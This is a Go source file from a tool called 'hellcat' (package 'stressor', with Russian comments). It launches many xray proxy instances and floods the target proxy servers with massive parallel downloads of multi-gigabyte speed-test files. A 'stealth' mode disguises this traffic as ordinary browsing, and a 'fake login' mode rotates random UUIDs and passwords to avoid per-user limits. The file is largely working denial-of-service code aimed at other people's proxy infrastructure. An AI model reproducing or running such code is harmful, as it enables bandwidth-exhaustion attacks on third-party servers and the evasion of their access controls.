// [hellcat]
package stressor

import (
    "crypto/rand"
    "crypto/tls"
    "fmt"
    "io"
    "log"
    "math/big"
    mathrand "math/rand"
    "net"
    "net/http"
    "net/url"
    "os"
    "os/exec"
    "runtime"
    "sync/atomic"
    "time"

    "hellcat/config"
    "hellcat/parser"
)

type XrayInstance struct {
    Cmd      *exec.Cmd
    Cfg      *parser.OutboundConfig
    Port     int
    ConfPath string
}

var userAgents = []string{
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
}

var payloads = []string{
    "https://speed.cloudflare.com/__down?bytes=10737418240",
    "https://speed.cloudflare.com/__down?bytes=50000000000",
    "http://speedtest.tele2.net/10GB.zip",
    "http://speedtest.tele2.net/1GB.zip",
    "http://proof.ovh.net/files/10Gb.dat",
    "https://proof.ovh.net/files/10Gb.dat",
    "http://proof.ovh.net/files/1Gb.dat",
    "http://bouygues.iperf.fr/10G.iso",
    "http://speedtest.ftp.otenet.gr/files/test1Gb.db",
    "https://speed.hetzner.de/1GB.bin",
    "http://ipv4.download.thinkbroadband.com/1GB.zip",
}

var stealthURLs = []string{
    "https://www.google.com/",
    "https://www.youtube.com/",
    "https://www.reddit.com/r/popular/.json?limit=100",
    "https://www.amazon.com/",
    "https://www.microsoft.com/en-us/windows",
    "https://www.github.com/",
    "https://en.wikipedia.org/wiki/Main_Page",
    "https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png",
    "https://github.com/ArtalkJS/Artalk/releases/download/v2.8.2/artalk_v2.8.2_linux_amd64.tar.gz",
}

var (
    requests        uint64
    errors          uint64
    bytesDownloaded uint64
    activeWorkers   int32
    stealthMode     bool
    customURL       string
    fakeLoginMode   bool
)

func getRandomPort() int {
    for i := 0; i < 100; i++ {
        port := mathrand.Intn(55000) + 10000
        ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
        if err == nil {
            ln.Close()
            return port
        }
    }
    ln, err := net.Listen("tcp", "127.0.0.1:0")
    if err != nil {
        return 0
    }
    port := ln.Addr().(*net.TCPAddr).Port
    ln.Close()
    return port
}

func formatSpeed(bytesPerSec float64) string {
    if bytesPerSec >= 1024*1024 {
        return fmt.Sprintf("%.1f MB/s", bytesPerSec/1024/1024)
    }
    if bytesPerSec >= 1024 {
        return fmt.Sprintf("%.0f KB/s", bytesPerSec/1024)
    }
    return fmt.Sprintf("%.0f B/s", bytesPerSec)
}

// --- ЛОГИКА FAKE LOGIN ---

func generateUUID() string {
    b := make([]byte, 16)
    _, err := rand.Read(b)
    if err != nil {
        return "00000000-0000-0000-0000-000000000000"
    }
    return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

func generatePassword(length int) string {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
    result := make([]byte, length)
    for i := 0; i < length; i++ {
        n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
        result[i] = chars[n.Int64()]
    }
    return string(result)
}

func mutateCredentials(cfg *parser.OutboundConfig) {
    // Благодаря нативному копированию *cfg, этот switch теперь БУДЕТ находить нужный тип!
    switch s := cfg.Settings.(type) {
    case parser.VnextSettings:
        for i := range s.Vnext {
            for j := range s.Vnext[i].Users {
                s.Vnext[i].Users[j].Id = generateUUID()
            }
        }
        cfg.Settings = s // Перезаписываем интерфейс новой структурой
    case parser.VMessSettings:
        for i := range s.Vnext {
            for j := range s.Vnext[i].Users {
                s.Vnext[i].Users[j].Id = generateUUID()
            }
        }
        cfg.Settings = s
    case parser.ServerSettings:
        for i := range s.Servers {
            if cfg.Protocol == "tuic" {
                s.Servers[i].Uuid = generateUUID()
            }
            s.Servers[i].Password = generatePassword(16)
        }
        cfg.Settings = s
    }
}

func restartInstance(inst *XrayInstance) {
    mutateCredentials(inst.Cfg)

    var newCred string
    switch s := inst.Cfg.Settings.(type) {
    case parser.VnextSettings:
        if len(s.Vnext) > 0 && len(s.Vnext[0].Users) > 0 {
            newCred = fmt.Sprintf("UUID: %s", s.Vnext[0].Users[0].Id)
        }
    case parser.VMessSettings:
        if len(s.Vnext) > 0 && len(s.Vnext[0].Users) > 0 {
            newCred = fmt.Sprintf("UUID: %s", s.Vnext[0].Users[0].Id)
        }
    case parser.ServerSettings:
        if len(s.Servers) > 0 {
            if inst.Cfg.Protocol == "tuic" {
                newCred = fmt.Sprintf("UUID: %s, Pass: %s", s.Servers[0].Uuid, s.Servers[0].Password)
            } else {
                newCred = fmt.Sprintf("Pass: %s", s.Servers[0].Password)
            }
        }
    }
    log.Printf("[hellcat] 🔑 [Port %d] Restarting -> %s", inst.Port, newCred)

    if inst.Cmd != nil && inst.Cmd.Process != nil {
        inst.Cmd.Process.Kill()
        inst.Cmd.Wait()
    }

    os.Remove(inst.ConfPath)

    // Теперь config.go получит СТРОГО типизированную структуру с новым UUID
    newConfPath := config.GenerateWithPort(inst.Cfg, inst.Port)
    inst.ConfPath = newConfPath

    cmd := exec.Command("xray", "-config", newConfPath)
    cmd.Stdout = nil
    cmd.Stderr = nil
    if err := cmd.Start(); err != nil {
        log.Printf("[hellcat] ❌ Failed to restart xray on port %d: %v", inst.Port, err)
        return
    }
    inst.Cmd = cmd

    go func() {
        if err := cmd.Wait(); err != nil {
            log.Printf("[hellcat] ⚠️  xray (port %d) exited: %v", inst.Port, err)
        }
    }()
}

// ---------------------------------

func Run(cfgs []*parser.OutboundConfig, threads int, duration int, numXray int, insane bool, stealth bool, customTarget string, fakelogin bool) {
    stealthMode = stealth
    customURL = customURL
    fakeLoginMode = fakelogin

    if customURL != "" {
        payloads = []string{customTarget}
        stealthURLs = []string{customTarget}
    }

    modeStr := "HEAVY BANDWIDTH"
    if stealthMode {
        modeStr = "STEALTH BANDWIDTH"
    }

    log.Printf("[hellcat] 🌊 %s MODE ENGAGED", modeStr)
    if fakeLoginMode {
        log.Printf("[hellcat] 🔑 FAKE LOGIN ENABLED (Rotating credentials every 1000 reqs)")
    }
    log.Printf("[hellcat] 📊 %d xray instances", numXray)

    if len(cfgs) > 1 {
        for i, c := range cfgs {
            log.Printf("[hellcat] 🌐 [%d/%d] %s (%s)", i+1, len(cfgs), getTargetInfo(c), c.Protocol)
        }
    } else if len(cfgs) == 1 {
        log.Printf("[hellcat] 🌐 Primary: %s (%s)", getTargetInfo(cfgs[0]), cfgs[0].Protocol)
    }

    stop := make(chan struct{})
    if duration > 0 {
        log.Printf("[hellcat] ⏱️  Duration: %d sec", duration)
        time.AfterFunc(time.Duration(duration)*time.Second, func() {
            log.Println("[hellcat] ⏰ Stopping...")
            close(stop)
        })
    }

    instances := make([]*XrayInstance, numXray)
    log.Println("[hellcat] ⏳ Generating random configs and starting Xray instances...")
    for i := 0; i < numXray; i++ {
        port := getRandomPort()

        // ПРАВИЛЬНОЕ КОПИРОВАНИЕ: Создаем независимый экземпляр структуры, сохраняя её типы!
        cfgCopy := *cfgs[i%len(cfgs)]
        cfg := &cfgCopy

        if fakeLoginMode {
            mutateCredentials(cfg)
        }

        confPath := config.GenerateWithPort(cfg, port)

        cmd := exec.Command("xray", "-config", confPath)
        cmd.Stdout = nil
        cmd.Stderr = nil
        if err := cmd.Start(); err != nil {
            log.Printf("[hellcat] ❌ xray [%d] start: %v", i, err)
            continue
        }

        instances[i] = &XrayInstance{
            Cmd:      cmd,
            Cfg:      cfg,
            Port:     port,
            ConfPath: confPath,
        }

        log.Printf("[hellcat] ✓ xray [%d] PID %d Port %d", i, cmd.Process.Pid, port)
        go func(c *exec.Cmd, idx int) {
            if err := c.Wait(); err != nil {
                log.Printf("[hellcat] ⚠️  xray [%d] exited: %v", idx, err)
            }
        }(cmd, i)

        time.Sleep(150 * time.Millisecond)
    }

    log.Println("[hellcat] ⏳ Waiting for SOCKS proxies...")
    for _, inst := range instances {
        if inst == nil { continue }
        addr := fmt.Sprintf("127.0.0.1:%d", inst.Port)
        for i := 0; i < 20; i++ {
            conn, err := net.DialTimeout("tcp", addr, 500*time.Millisecond)
            if err == nil {
                conn.Close()
                break
            }
            time.Sleep(500 * time.Millisecond)
        }
    }

    clients := make([]*http.Client, numXray)
    for i, inst := range instances {
        if inst == nil { continue }
        proxyURL, _ := url.Parse(fmt.Sprintf("socks5h://127.0.0.1:%d", inst.Port))
        tr := &http.Transport{
            Proxy: http.ProxyURL(proxyURL),
            DialContext: (&net.Dialer{
                Timeout:   30 * time.Second,
                KeepAlive: 30 * time.Second,
            }).DialContext,
            TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
            DisableKeepAlives:     false,
            MaxIdleConns:          10000,
            MaxIdleConnsPerHost:   10000,
            MaxConnsPerHost:       100000,
            IdleConnTimeout:       0,
            TLSHandshakeTimeout:   15 * time.Second,
            ResponseHeaderTimeout: 15 * time.Second,
        }
        clients[i] = &http.Client{Transport: tr, Timeout: 0}
    }

    streamsPerProxy := threads / numXray
    if streamsPerProxy < 5 {
        streamsPerProxy = 5
    }
    totalGoroutines := streamsPerProxy * numXray
    log.Printf("[hellcat] 🚀 Spawning %d heavy persistent streams (%d per proxy)...", totalGoroutines, streamsPerProxy)

    for i := 0; i < numXray; i++ {
        if clients[i] == nil { continue }
        client := clients[i]
        for j := 0; j < streamsPerProxy; j++ {
            atomic.AddInt32(&activeWorkers, 1)
            go func(c *http.Client) {
                defer atomic.AddInt32(&activeWorkers, -1)
                for {
                    select {
                    case <-stop:
                        return
                    default:
                        if stealthMode {
                            stealthRequest(c)
                        } else {
                            downloadFull(c)
                        }
                    }
                }
            }(client)
        }
    }

    lastRotationReq := uint64(0)

    ticker := time.NewTicker(3 * time.Second)
    defer ticker.Stop()
    for {
        select {
        case <-stop:
            goto cleanup
        case <-ticker.C:
            succ := atomic.LoadUint64(&requests)
            fail := atomic.LoadUint64(&errors)
            bytes := atomic.SwapUint64(&bytesDownloaded, 0)

            speed := formatSpeed(float64(bytes) / 3.0)
            goroutines := runtime.NumGoroutine()

            log.Printf("[hellcat] 🌊 %s | Total req: %d | Err: %d | Active: %d | Goroutines: %d",
                speed, succ, fail, atomic.LoadInt32(&activeWorkers), goroutines)

            if fakeLoginMode && succ > 0 {
                currentThousand := succ / 1000
                lastThousand := lastRotationReq / 1000
                if currentThousand > lastThousand {
                    lastRotationReq = succ
                    log.Printf("[hellcat] 🔑 Crossed %dk requests! Rotating credentials & restarting Xrays...", currentThousand*1000)

                    go func() {
                        for _, inst := range instances {
                            if inst != nil {
                                restartInstance(inst)
                            }
                        }
                        log.Println("[hellcat] 🔑 Xrays restarted with new identities. Resuming...")
                    }()
                }
            }
        }
    }

cleanup:
    time.Sleep(3 * time.Second)
    for _, inst := range instances {
        if inst != nil {
            if inst.Cmd != nil && inst.Cmd.Process != nil {
                inst.Cmd.Process.Kill()
            }
            os.Remove(inst.ConfPath)
        }
    }
    log.Println("[hellcat] ✅ Finished.")
}

func downloadFull(client *http.Client) {
    target := payloads[mathrand.Intn(len(payloads))]
    req, _ := http.NewRequest("GET", target, nil)
    req.Header.Set("User-Agent", userAgents[mathrand.Intn(len(userAgents))])

    resp, err := client.Do(req)
    if err != nil {
        atomic.AddUint64(&errors, 1)
        time.Sleep(time.Duration(100+mathrand.Intn(400)) * time.Millisecond)
        return
    }
    defer resp.Body.Close()

    n, err := io.Copy(io.Discard, resp.Body)
    atomic.AddUint64(&bytesDownloaded, uint64(n))

    if n > 0 {
        atomic.AddUint64(&requests, 1)
        if err != nil {
            time.Sleep(time.Duration(50+mathrand.Intn(150)) * time.Millisecond)
        }
    } else {
        atomic.AddUint64(&errors, 1)
        time.Sleep(time.Duration(200+mathrand.Intn(300)) * time.Millisecond)
    }
}

func stealthRequest(client *http.Client) {
    target := stealthURLs[mathrand.Intn(len(stealthURLs))]
    req, _ := http.NewRequest("GET", target, nil)
    req.Header.Set("User-Agent", userAgents[mathrand.Intn(len(userAgents))])
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")

    resp, err := client.Do(req)
    if err != nil {
        atomic.AddUint64(&errors, 1)
        time.Sleep(time.Duration(100+mathrand.Intn(400)) * time.Millisecond)
        return
    }
    defer resp.Body.Close()

    n, _ := io.Copy(io.Discard, resp.Body)
    atomic.AddUint64(&bytesDownloaded, uint64(n))

    if n > 0 {
        atomic.AddUint64(&requests, 1)
    } else {
        atomic.AddUint64(&errors, 1)
        time.Sleep(time.Duration(200+mathrand.Intn(300)) * time.Millisecond)
    }
}

func getTargetInfo(cfg *parser.OutboundConfig) string {
    var host string
    var port int
    var network string
    var security string

    if cfg.StreamSetting != nil {
        network = cfg.StreamSetting.Network
        security = cfg.StreamSetting.Security
    }

    switch s := cfg.Settings.(type) {
    case parser.VnextSettings:
        if len(s.Vnext) > 0 {
            host = s.Vnext[0].Address
            port = s.Vnext[0].Port
        }
    case parser.VMessSettings:
        if len(s.Vnext) > 0 {
            host = s.Vnext[0].Address
            port = s.Vnext[0].Port
        }
    case parser.ServerSettings:
        if len(s.Servers) > 0 {
            host = s.Servers[0].Address
            port = s.Servers[0].Port
        }
    }

    return fmt.Sprintf("%s:%d (%s/%s)", host, port, network, security)
}
